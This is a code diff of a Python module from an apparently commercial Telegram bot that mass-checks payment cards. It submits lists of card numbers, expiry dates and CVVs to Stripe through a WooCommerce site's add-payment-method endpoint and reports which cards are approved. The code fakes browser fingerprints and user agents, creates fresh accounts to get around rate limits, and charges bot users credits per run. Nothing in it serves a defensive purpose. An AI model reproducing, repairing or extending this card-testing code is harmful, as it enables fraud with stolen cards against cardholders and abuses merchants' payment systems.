@@ -1,5 +1,4 @@
-# BOT/gates/auth/mass/masschk.py
-# Mass Stripe Auth 2 Checker - Uses stauth2.py API with massau.py UI
+# BOT/gates/auth/stripe/masschk.py
 
 import asyncio
 import json
@@ -16,15 +15,12 @@ import string
 import os
 from pathlib import Path
 
-# CORRECT IMPORTS based on your credit.py
-from BOT.gates.auth.stripe.stauth import StripeAuthChecker, logger, load_users, is_user_banned, check_cooldown, get_user_plan
+# CORRECT IMPORTS based on your structure
+from BOT.gates.auth.stripe.stauth2 import StripeAuth2Checker, logger, load_users, is_user_banned, check_cooldown, get_user_plan
 from BOT.helper.permissions import auth_and_free_restricted
 from BOT.helper.Admins import is_command_disabled, get_command_offline_message
 from BOT.gc.credit import deduct_credit, get_user_credits, has_sufficient_credits, charge_processor
 from BOT.helper.filter import extract_cards
-
-# Import StripeAuth2Checker for the API
-from BOT.gates.auth.stripe.stauth2 import StripeAuth2Checker, SmartCardParser
 
 # Download directory
 DOWNLOAD_DIR = "BOT/downloads"
@@ -93,7 +89,7 @@ async def parse_card_list_from_reply(client, message):
         
     # Case 2: Reply to a text message
     elif replied.text:
-        # Extract cards directly from text using filter.py
+        # Extract cards directly from text
         all_cards, unique_cards = extract_cards(replied.text)
         card_list = unique_cards
     
@@ -153,26 +149,26 @@ class MassStripeAuth2Checker:
         self.max_retries = 2  # Maximum retries per card when rate limited
         
     async def create_fresh_session(self):
-        """Create a brand new session with new account using stauth2.py method"""
+        """Create a brand new session with new account"""
         try:
             # Close existing session if any
             if self.current_client:
                 try:
-                    await self.current_client.close()
+                    await self.current_client.aclose()
                 except:
                     pass
                 self.current_client = None
                 self.current_nonce = None
             
-            # Create new session using stauth2.py method
-            logger.info("🔄 Creating fresh session with new account for masschk...")
-            session, nonce, session_msg = await self.checker.create_authenticated_session()
+            # Create new session
+            logger.info("🔄 Creating fresh session with new account...")
+            client, nonce, session_msg = await self.checker.create_authenticated_session()
             
             if nonce:
-                self.current_client = session
+                self.current_client = client
                 self.current_nonce = nonce
                 self.retry_count = 0
-                logger.success("✅ New session created successfully for masschk")
+                logger.success("✅ New session created successfully")
                 return True
             else:
                 logger.error(f"❌ Failed to create session: {session_msg}")
@@ -204,56 +200,24 @@ class MassStripeAuth2Checker:
                 return True
         return False
     
-    def parse_card_details(self, card_details):
-        """Parse card details from string using filter.py format"""
-        try:
-            # card_details should be in format "cc|mm|yy|cvv" from extract_cards
-            cc_parts = card_details.split('|')
-            if len(cc_parts) < 4:
-                return "", "", "", ""
-            
-            cc = cc_parts[0].strip().replace(" ", "")
-            mes = cc_parts[1].strip()
-            ano = cc_parts[2].strip()
-            cvv = cc_parts[3].strip()
-            
-            # Format month with leading zero if needed
-            if len(mes) == 1:
-                mes = f"0{mes}"
-            
-            # Format year: if 2 digits, convert to 4 digits
-            if len(ano) == 2:
-                ano = '20' + ano
-                
-            return cc, mes, ano, cvv
-        except:
-            return "", "", "", ""
-    
     async def check_card_with_session(self, card_details, username, user_data, client=None, nonce=None, retry_count=0):
-        """Check card using existing session with stauth2.py API"""
+        """OPTIMIZED: Check card using existing session (for mass checking) with rate limit handling"""
         start_time = time.time()
         
-        # Parse card details using our parser
-        cc, mes, ano, cvv = self.parse_card_details(card_details)
+        # Parse card details using SmartCardParser from stauth2.py
+        cc, mes, ano, cvv = self.checker.smart_parser.extract_card_from_text(card_details)
         
-        if not cc or not mes or not ano or not cvv:
+        if not cc:
             return self.format_mass_card_response(
-                card_details.split('|')[0] if '|' in card_details else "Unknown",
-                mes, ano, cvv, "ERROR", "Invalid card format",
+                "", "", "", "", "ERROR", "Could not parse card details", 
                 username, time.time()-start_time, user_data, None
             )
         
         try:
-            # Get BIN info using stauth2.py method
+            # Get BIN info
             bin_info = await self.checker.get_bin_info(cc)
             
-            # Use stauth2.py's check_card method but adapt to our needs
-            # We need to create a card details string that stauth2.py expects
-            # But we'll use the direct API approach similar to stauth2.py
-            
-            # Create Stripe payment method using stauth2.py's approach
-            self.checker.generate_browser_fingerprint()
-            
+            # Generate random browser fingerprints
             client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
             guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
             muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
@@ -264,6 +228,7 @@ class MassStripeAuth2Checker:
             # Format card number with spaces as shown in trace
             formatted_cc = f"{cc[:4]} {cc[4:8]} {cc[8:12]} {cc[12:]}"
             
+            # Create Stripe payment method using existing session
             stripe_data = {
                 'type': 'card',
                 'card[number]': formatted_cc,
@@ -274,7 +239,7 @@ class MassStripeAuth2Checker:
                 'billing_details[address][postal_code]': postal_code,
                 'billing_details[address][country]': 'US',
                 'pasted_fields': 'number',
-                'payment_user_agent': f'stripe.js/065b474d33; stripe-js-v3/065b474d33; payment-element; deferred-intent',
+                'payment_user_agent': f'stripe.js/{random.choice(["065b474d33", "8e9b241db6"])}; stripe-js-v3/{random.choice(["065b474d33", "8e9b241db6"])}; payment-element; deferred-intent',
                 'referrer': self.checker.base_url,
                 'time_on_page': str(random.randint(30000, 120000)),
                 'client_attribution_metadata[client_session_id]': client_session_id,
@@ -302,193 +267,143 @@ class MassStripeAuth2Checker:
                 'user-agent': self.checker.user_agent,
                 'sec-ch-ua': self.checker.sec_ch_ua,
                 'sec-ch-ua-mobile': self.checker.sec_ch_ua_mobile,
-                'sec-ch-ua-platform': self.checker.sec_ch_ua_platform,
+                'sec-ch-ua-platform': self.checker.sec_ch_ua_platform
             }
             
-            # Use the client session for Stripe API
-            async with client.post(
-                "https://api.stripe.com/v1/payment_methods",
-                headers=stripe_headers,
-                data=stripe_data,
-                timeout=30
-            ) as stripe_response:
-                
-                if stripe_response.status != 200:
-                    error_text = await stripe_response.text()
-                    error_text = error_text[:150] if error_text else "No response"
-                    
-                    # Check for rate limit
-                    if self.is_rate_limit_error(error_text) and retry_count < self.max_retries:
-                        logger.info(f"🔄 Rate limit detected, retrying with new session (attempt {retry_count + 1})")
-                        
-                        # Create new session for this card only
-                        new_session, new_nonce, session_msg = await self.checker.create_authenticated_session()
-                        if new_nonce:
-                            # Retry this card with new session
-                            result = await self.check_card_with_session(
-                                card_details, username, user_data, new_session, new_nonce, retry_count + 1
-                            )
-                            # Close the new session after use
-                            try:
-                                await new_session.close()
-                            except:
-                                pass
-                            return result
+            stripe_response = await client.post(
+                "https://api.stripe.com/v1/payment_methods", 
+                headers=stripe_headers, 
+                data=stripe_data
+            )
+            
+            if stripe_response.status != 200:
+                error_text = await stripe_response.text() if stripe_response.content else "No response"
+                error_text = error_text[:150]
+                return self.format_mass_card_response(
+                    cc, mes, ano, cvv, "DECLINED", 
+                    f"Stripe Error: {error_text}", 
+                    username, time.time()-start_time, user_data, bin_info
+                )
+            
+            stripe_json = await stripe_response.json()
+            
+            if "error" in stripe_json:
+                error_msg = stripe_json["error"].get("message", "Stripe declined")
+                return self.format_mass_card_response(
+                    cc, mes, ano, cvv, "DECLINED", error_msg, 
+                    username, time.time()-start_time, user_data, bin_info
+                )
+            
+            payment_method_id = stripe_json.get("id")
+            if not payment_method_id:
+                return self.format_mass_card_response(
+                    cc, mes, ano, cvv, "DECLINED", "Payment method creation failed", 
+                    username, time.time()-start_time, user_data, bin_info
+                )
+            
+            # Confirm setup intent via AJAX
+            ajax_url = f"{self.checker.base_url}/wp-admin/admin-ajax.php"
+            ajax_headers = self.checker.get_base_headers()
+            ajax_headers.update({
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Origin': self.checker.base_url,
+                'Referer': f"{self.checker.base_url}/my-account/add-payment-method/",
+                'X-Requested-With': 'XMLHttpRequest',
+            })
+            
+            ajax_data = {
+                'action': 'wc_stripe_create_and_confirm_setup_intent',
+                'wc-stripe-payment-method': payment_method_id,
+                'wc-stripe-payment-type': 'card',
+                '_ajax_nonce': nonce
+            }
+            
+            ajax_response = await client.post(ajax_url, headers=ajax_headers, data=ajax_data)
+            
+            if ajax_response.status != 200:
+                return self.format_mass_card_response(
+                    cc, mes, ano, cvv, "DECLINED", f"AJAX Error: {ajax_response.status}", 
+                    username, time.time()-start_time, user_data, bin_info
+                )
+            
+            result = await ajax_response.json()
+            
+            if result.get("success"):
+                # Check for 3DS
+                if (isinstance(result.get("data"), dict) and 
+                    result["data"].get("status") == "requires_action" and
+                    result["data"].get("next_action", {}).get("type") == "use_stripe_sdk" and
+                    "three_d_secure_2_source" in str(result["data"])):
                     
                     return self.format_mass_card_response(
-                        cc, mes, ano, cvv, "DECLINED", 
-                        f"Stripe Error: {error_text}", 
+                        cc, mes, ano, cvv, "APPROVED", "**Stripe_3ds_Fingerprint**", 
                         username, time.time()-start_time, user_data, bin_info
                     )
                 
-                stripe_json = await stripe_response.json()
+                return self.format_mass_card_response(
+                    cc, mes, ano, cvv, "APPROVED", "Successful", 
+                    username, time.time()-start_time, user_data, bin_info
+                )
+            else:
+                error_data = result.get("data", {})
+                error_message = "Transaction Declined"
                 
-                if "error" in stripe_json:
-                    error_msg = stripe_json["error"].get("message", "Stripe declined")
+                if isinstance(error_data, dict):
+                    if "error" in error_data:
+                        error_obj = error_data["error"]
+                        if isinstance(error_obj, dict):
+                            error_message = error_obj.get("message", "Card Declined")
+                        else:
+                            error_message = str(error_obj)
+                    elif "message" in error_data:
+                        error_message = error_data["message"]
+                elif isinstance(error_data, str):
+                    error_message = error_data
+                
+                # Check for rate limit error - retry with new session if needed
+                if self.is_rate_limit_error(error_message) and retry_count < self.max_retries:
+                    logger.info(f"🔄 Rate limit detected, retrying with new session (attempt {retry_count + 1})")
                     
-                    # Check for rate limit
-                    if self.is_rate_limit_error(error_msg) and retry_count < self.max_retries:
-                        logger.info(f"🔄 Rate limit detected, retrying with new session (attempt {retry_count + 1})")
-                        
-                        # Create new session for this card only
-                        new_session, new_nonce, session_msg = await self.checker.create_authenticated_session()
-                        if new_nonce:
-                            # Retry this card with new session
-                            result = await self.check_card_with_session(
-                                card_details, username, user_data, new_session, new_nonce, retry_count + 1
-                            )
-                            # Close the new session after use
-                            try:
-                                await new_session.close()
-                            except:
-                                pass
-                            return result
-                    
-                    return self.format_mass_card_response(
-                        cc, mes, ano, cvv, "DECLINED", error_msg, 
-                        username, time.time()-start_time, user_data, bin_info
-                    )
-                
-                payment_method_id = stripe_json.get("id")
-                if not payment_method_id:
-                    return self.format_mass_card_response(
-                        cc, mes, ano, cvv, "DECLINED", "Payment method creation failed", 
-                        username, time.time()-start_time, user_data, bin_info
-                    )
-                
-                # Confirm setup intent via AJAX
-                ajax_url = f"{self.checker.base_url}/wp-admin/admin-ajax.php"
-                ajax_headers = self.checker.get_base_headers()
-                ajax_headers.update({
-                    'Accept': '*/*',
-                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'Origin': self.checker.base_url,
-                    'Referer': f"{self.checker.base_url}/my-account/add-payment-method/",
-                    'X-Requested-With': 'XMLHttpRequest',
-                })
-                
-                ajax_data = {
-                    'action': 'wc_stripe_create_and_confirm_setup_intent',
-                    'wc-stripe-payment-method': payment_method_id,
-                    'wc-stripe-payment-type': 'card',
-                    '_ajax_nonce': nonce
-                }
-                
-                async with client.post(ajax_url, headers=ajax_headers, data=ajax_data) as ajax_response:
-                    
-                    if ajax_response.status != 200:
-                        error_detail = "Bad Request"
+                    # Create new session for this card only
+                    new_client, new_nonce, session_msg = await self.checker.create_authenticated_session()
+                    if new_nonce:
+                        # Retry this card with new session
+                        result = await self.check_card_with_session(
+                            card_details, username, user_data, new_client, new_nonce, retry_count + 1
+                        )
+                        # Close the new session after use
                         try:
-                            error_json = await ajax_response.json()
-                            if isinstance(error_json, dict):
-                                if 'data' in error_json and 'message' in error_json['data']:
-                                    error_detail = error_json['data']['message']
+                            await new_client.aclose()
                         except:
                             pass
-                        
+                        return result
+                    else:
                         return self.format_mass_card_response(
-                            cc, mes, ano, cvv, "DECLINED", f"AJAX Error: {error_detail}", 
+                            cc, mes, ano, cvv, "DECLINED", "Rate limit - failed to create new session", 
                             username, time.time()-start_time, user_data, bin_info
                         )
-                    
-                    try:
-                        result = await ajax_response.json()
-                        
-                        if result.get("success"):
-                            # Check for 3DS
-                            if (isinstance(result.get("data"), dict) and 
-                                result["data"].get("status") == "requires_action" and
-                                "three_d_secure" in str(result["data"])):
-                                
-                                return self.format_mass_card_response(
-                                    cc, mes, ano, cvv, "APPROVED", "**Stripe_3ds_Fingerprint**", 
-                                    username, time.time()-start_time, user_data, bin_info
-                                )
-                            
-                            return self.format_mass_card_response(
-                                cc, mes, ano, cvv, "APPROVED", "Successful", 
-                                username, time.time()-start_time, user_data, bin_info
-                            )
-                        else:
-                            error_data = result.get("data", {})
-                            error_message = "Transaction Declined"
-                            
-                            if isinstance(error_data, dict):
-                                if "error" in error_data:
-                                    error_obj = error_data["error"]
-                                    if isinstance(error_obj, dict):
-                                        error_message = error_obj.get("message", "Card Declined")
-                                    else:
-                                        error_message = str(error_obj)
-                                elif "message" in error_data:
-                                    error_message = error_data["message"]
-                            elif isinstance(error_data, str):
-                                error_message = error_data
-                            
-                            # Check for rate limit error
-                            if self.is_rate_limit_error(error_message) and retry_count < self.max_retries:
-                                logger.info(f"🔄 Rate limit detected, retrying with new session (attempt {retry_count + 1})")
-                                
-                                # Create new session for this card only
-                                new_session, new_nonce, session_msg = await self.checker.create_authenticated_session()
-                                if new_nonce:
-                                    # Retry this card with new session
-                                    result = await self.check_card_with_session(
-                                        card_details, username, user_data, new_session, new_nonce, retry_count + 1
-                                    )
-                                    # Close the new session after use
-                                    try:
-                                        await new_session.close()
-                                    except:
-                                        pass
-                                    return result
-                            
-                            return self.format_mass_card_response(
-                                cc, mes, ano, cvv, "DECLINED", error_message, 
-                                username, time.time()-start_time, user_data, bin_info
-                            )
-                            
-                    except json.JSONDecodeError:
-                        return self.format_mass_card_response(
-                            cc, mes, ano, cvv, "DECLINED", "Invalid server response", 
-                            username, time.time()-start_time, user_data, bin_info
-                        )
-                    
+                
+                return self.format_mass_card_response(
+                    cc, mes, ano, cvv, "DECLINED", error_message, 
+                    username, time.time()-start_time, user_data, bin_info
+                )
+                
         except Exception as e:
             # Check if it's a rate limit error in the exception
             if self.is_rate_limit_error(str(e)) and retry_count < self.max_retries:
                 logger.info(f"🔄 Rate limit exception, retrying with new session (attempt {retry_count + 1})")
                 
                 # Create new session for this card only
-                new_session, new_nonce, session_msg = await self.checker.create_authenticated_session()
+                new_client, new_nonce, session_msg = await self.checker.create_authenticated_session()
                 if new_nonce:
                     # Retry this card with new session
                     result = await self.check_card_with_session(
-                        card_details, username, user_data, new_session, new_nonce, retry_count + 1
+                        card_details, username, user_data, new_client, new_nonce, retry_count + 1
                     )
                     # Close the new session after use
                     try:
-                        await new_session.close()
+                        await new_client.aclose()
                     except:
                         pass
                     return result
@@ -501,7 +416,7 @@ class MassStripeAuth2Checker:
             )
     
     def format_mass_card_response(self, cc, mes, ano, cvv, status, message, username, elapsed_time, user_data, bin_info):
-        """Format individual card response for mass check with /mchk in header - matches stauth2.py UI"""
+        """Format individual card response for mass check with /mchk in header - UI from stauth2.py"""
         user_id = user_data.get("user_id", "Unknown")
         first_name = html.escape(user_data.get("first_name", "User"))
         badge = user_data.get("plan", {}).get("badge", "🎭")
@@ -521,12 +436,12 @@ class MassStripeAuth2Checker:
         
         # Handle case when bin_info is None
         if bin_info:
-            bank_info = bin_info.get('bank', 'N/A').upper() if bin_info.get('bank', 'N/A') != 'N/A' else 'N/A'
-            scheme = bin_info.get('scheme', 'N/A')
-            card_type = bin_info.get('type', 'N/A')
-            brand = bin_info.get('brand', 'N/A')
-            country = bin_info.get('country', 'N/A')
-            emoji = bin_info.get('emoji', '🏳️')
+            bank_info = bin_info['bank'].upper() if bin_info['bank'] != 'N/A' else 'N/A'
+            scheme = bin_info['scheme']
+            card_type = bin_info['type']
+            brand = bin_info['brand']
+            country = bin_info['country']
+            emoji = bin_info['emoji']
         else:
             bank_info = 'N/A'
             scheme = 'N/A'
@@ -538,11 +453,11 @@ class MassStripeAuth2Checker:
         response = f"""<b>「$cmd → /mchk」| <b>WAYNE</b> </b>
 ━━━━━━━━━━━━━━━
 <b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
-<b>[•] Gateway -</b> Stripe Auth 2 Mass
+<b>[•] Gateway -</b> Stripe Auth 2
 <b>[•] Status-</b> <code>{status_text} {status_emoji}</code>
 <b>[•] Response-</b> <code>{message}</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-<b>[+] Bin:</b> <code>{cc[:6]}</code>  
+<b>[+] Bin:</b> <code>{cc[:6] if cc else 'N/A'}</code>  
 <b>[+] Info:</b> <code>{scheme} - {card_type} - {brand}</code>
 <b>[+] Bank:</b> <code>{bank_info}</code> 🏦
 <b>[+] Country:</b> <code>{country}</code> [{emoji}]
@@ -575,7 +490,9 @@ class MassStripeAuth2Checker:
     async def send_approved_card_immediately(self, client, message, result, card_number, total_cards):
         """Send approved card immediately without waiting for all cards to finish"""
         try:
+            # result is already a string, no need to await
             await message.reply(result, disable_web_page_preview=True)
+            # Small delay to avoid flooding
             await asyncio.sleep(0.5)
             return True
         except Exception as e:
@@ -742,7 +659,7 @@ async def handle_mass_stripe_auth2(client: Client, message: Message):
 ━━━━━━━━━━━━━""")
             return
         
-        # Check if user has enough credits for mass check (3 credits for entire command)
+        # IMPORTANT: Check if user has enough credits for mass check (3 credits for entire command)
         has_credits, credit_msg = has_sufficient_credits(user_id, 3)
         
         if not has_credits:
@@ -756,7 +673,7 @@ async def handle_mass_stripe_auth2(client: Client, message: Message):
 ━━━━━━━━━━━━━""")
             return
         
-        # Deduct 3 credits BEFORE processing mass check (ONCE for entire command)
+        # IMPORTANT: Deduct 3 credits BEFORE processing mass check (ONCE for entire command)
         deduct_success, deduct_msg = deduct_credit(user_id, 3)
         
         if not deduct_success:
@@ -781,8 +698,8 @@ async def handle_mass_stripe_auth2(client: Client, message: Message):
         failed = 0
         errors = 0
         
-        # Create ONE shared session for ALL cards using stauth2.py method
-        print("🔄 Creating shared session for mass check (Stripe Auth 2)...")
+        # OPTIMIZATION: Create ONE shared session for ALL cards
+        print("🔄 Creating shared session for mass check...")
         client, nonce, session_msg = await mass_checker.checker.create_authenticated_session()
         
         if not nonce:
@@ -848,14 +765,14 @@ async def handle_mass_stripe_auth2(client: Client, message: Message):
                 except:
                     pass
             
-            # Reduced delay: 1-2 seconds for faster processing
+            # REDUCED DELAY: From 2-4 seconds to 1-2 seconds for faster processing
             if i < len(card_list) - 1:
                 await asyncio.sleep(random.uniform(1, 2))
         
         # Close the shared session after all cards are processed
         if client:
             try:
-                await client.close()
+                await client.aclose()
                 print("✅ Shared session closed successfully")
             except:
                 print("⚠️ Failed to close shared session")
